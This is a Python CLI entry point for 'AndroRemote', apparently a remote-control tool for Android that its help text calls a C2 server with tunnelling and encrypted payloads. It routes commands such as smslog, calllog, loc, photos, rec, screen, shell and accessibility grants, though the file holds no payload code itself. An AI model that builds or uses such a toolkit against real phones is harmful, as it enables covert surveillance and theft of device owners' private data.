#!/usr/bin/env python3
"""Unified CLI entry point for the `androremote` command."""

import os
import sys
from androremote import __version__
from androremote.plugins.base import PluginContext
from androremote.plugins.manager import PluginManager


ADB_COMMANDS = {
    "serve", "launch", "consent", "update", "axenable", "axdisable", "tap",
    "swipe", "settext", "gaction", "installstatus", "wake", "vol", "clipset",
    "clipget", "torch", "vibrate", "apps", "startapp", "notifs", "notifsenable",
    "notifsdisable", "ping", "id", "perms", "log", "smslog", "shell", "ls",
    "get", "put", "screen", "sms", "calllog", "call", "loc", "photos", "rec"
}


def print_general_help():
    from rich.console import Console
    from rich.panel import Panel
    from rich import box

    c = Console(highlight=False)
    help_text = (
        "[bold cyan]AndroRemote[/bold cyan] — Headless Android remote-management agent & C2 server.\n\n"
        "[bold white]Usage:[/bold white]\n"
        "  [green]androremote[/green] [dim][c2-options][/dim]              Start C2 server & operator REPL (default)\n"
        "  [green]androremote c2[/green] [dim][c2-options][/dim]           Explicitly start C2 server\n"
        "  [green]androremote plugins[/green] [dim][subcommand][/dim]      Manage modular plugins\n"
        "  [green]androremote adb[/green] [dim]<command>[/dim]           Direct adb USB bridge commands\n\n"
        "[bold white]C2 Server Options:[/bold white]\n"
        "  [cyan]--port PORT[/cyan]                   C2 HTTP listen port (default: 8742)\n"
        "  [cyan]--tls[/cyan]                         Enable TLS listener with self-signed cert\n"
        "  [cyan]--no-enc[/cyan]                      Disable AES-256-GCM payload encryption\n"
        "  [cyan]--tunnel {named,quick,off}[/cyan]    Cloudflare tunnel mode (default: quick/named)\n"
        "  [cyan]--setup-tunnel HOST[/cyan]           Configure persistent named Cloudflare tunnel\n\n"
        "[bold white]Plugin Subcommands:[/bold white]\n"
        "  [cyan]plugins list[/cyan]                  List installed and built-in plugins\n"
        "  [cyan]plugins info <name>[/cyan]          Show plugin details and commands\n"
        "  [cyan]plugins path[/cyan]                  Show plugin search directories\n\n"
        "[bold white]ADB Shortcuts (USB/Direct):[/bold white]\n"
        "  [cyan]androremote axenable[/cyan]          Grant accessibility + background exemptions\n"
        "  [cyan]androremote launch[/cyan]            Launch MainActivity to request initial perms\n"
        "  [cyan]androremote ping[/cyan]              Ping agent over local port forward\n"
        "  [cyan]androremote shell <cmd>[/cyan]        Run shell command directly via adb forward\n"
    )
    c.print(Panel(help_text, title="[bold cyan]androremote CLI[/bold cyan]", border_style="cyan", box=box.ROUNDED))


def handle_plugins_cli(args):
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.markup import escape
    from rich import box

    console = Console(highlight=False)
    home_dir = os.path.expanduser("~/.androremote")
    user_plugins_dir = os.path.join(home_dir, "plugins")

    ctx = PluginContext(
        console=console,
        get_active_id=lambda: None,
        get_clients=lambda: {},
        send_and_wait_fn=lambda *a, **kw: None,
        queue_fn=lambda *a, **kw: None,
        broadcast_fn=lambda *a, **kw: None,
        alias_tag_fn=lambda cid: cid,
        resolve_tag_fn=lambda tag: tag,
        log_fn=lambda *a, **kw: None,
        show_result_fn=lambda *a, **kw: None,
        home_dir=home_dir,
    )
    pm = PluginManager(ctx)
    pm.load_all()

    sub = args[0].lower() if args else "list"
    subargs = args[1:]

    if sub in ("list", "ls"):
        table = Table(
            title="[bold cyan]ANDROREMOTE MODULAR PLUGINS[/bold cyan]",
            box=box.ROUNDED,
            header_style="bold magenta",
            border_style="cyan",
            expand=True,
        )
        table.add_column("Plugin", style="bold cyan", width=14)
        table.add_column("Version", style="dim", width=8)
        table.add_column("Commands", style="white", width=22)
        table.add_column("Description", style="white")
        table.add_column("Status", width=10, justify="center")

        if not pm.plugins:
            table.add_row("-", "-", "-", "[dim]No plugins loaded[/dim]", "-")
        else:
            for name, p in sorted(pm.plugins.items()):
                cmds = ", ".join(f"/{c.name}" for c in p._commands) or "[dim]none[/dim]"
                status = "[bold green]enabled[/bold green]" if p.enabled else "[bold red]disabled[/bold red]"
                table.add_row(name, p.version, cmds, p.description, status)

        console.print(table)
        console.print(f"  [dim]Plugins directory: [cyan]{user_plugins_dir}[/cyan][/dim]")
        console.print("  [dim]Drop any custom [cyan].py[/cyan] plugin into this folder to auto-load in C2.[/dim]\n")

    elif sub == "info":
        if not subargs:
            console.print("[yellow]Usage: androremote plugins info <name>[/yellow]")
            return
        pname = subargs[0]
        p = pm.plugins.get(pname)
        if not p:
            console.print(f"[red]Plugin not found: '{pname}'[/red]")
            return
        cmds_info = "\n".join(f"  [bold cyan]/{c.name}[/bold cyan] - {escape(c.description)}" for c in p._commands) or "  [dim]None[/dim]"
        hooks_list = []
        for hname, handlers in pm.hooks.items():
            if any(pl == p for pl, _ in handlers):
                hooks_list.append(hname)
        hooks_info = ", ".join(hooks_list) or "[dim]None[/dim]"

        body = (
            f"[bold cyan]Name:[/] {p.name}\n"
            f"[bold cyan]Version:[/] {p.version}\n"
            f"[bold cyan]Author:[/] {p.author}\n"
            f"[bold cyan]Description:[/] {escape(p.description)}\n\n"
            f"[bold magenta]Registered Commands:[/]\n{cmds_info}\n\n"
            f"[bold magenta]Event Hooks:[/]\n  {hooks_info}\n"
        )
        pnl = Panel(body, title=f"[bold cyan]PLUGIN: {escape(p.name)}[/bold cyan]", border_style="cyan", box=box.ROUNDED, padding=(1, 2))
        console.print(pnl)

    elif sub == "path":
        from androremote.plugins import builtin
        builtin_dir = os.path.dirname(builtin.__file__)
        console.print(f"[bold cyan]Built-in plugins:[/] {builtin_dir}")
        console.print(f"[bold cyan]User plugins:[/]     {user_plugins_dir}")


def main(argv=None):
    if argv is None:
        argv = sys.argv[1:]

    # Handle version and help flags
    if argv and argv[0] in ("--version", "-v"):
        print(f"AndroRemote v{__version__}")
        return

    if argv and argv[0] in ("--help", "-h"):
        print_general_help()
        return

    if not argv:
        # Default action: run C2 server
        from androremote.c2 import main as c2_main
        c2_main([])
        return

    first = argv[0].lower()

    if first == "c2":
        from androremote.c2 import main as c2_main
        c2_main(argv[1:])
    elif first in ("plugin", "plugins"):
        handle_plugins_cli(argv[1:])
    elif first == "adb":
        from androremote.adb import main as adb_main
        adb_main(argv[1:])
    elif first in ADB_COMMANDS:
        # Direct ADB command shortcut
        from androremote.adb import main as adb_main
        adb_main(argv)
    elif first.startswith("-"):
        # Argument flags like --port, --tls, --no-enc passed to c2
        from androremote.c2 import main as c2_main
        c2_main(argv)
    else:
        print_general_help()


if __name__ == "__main__":
    main()
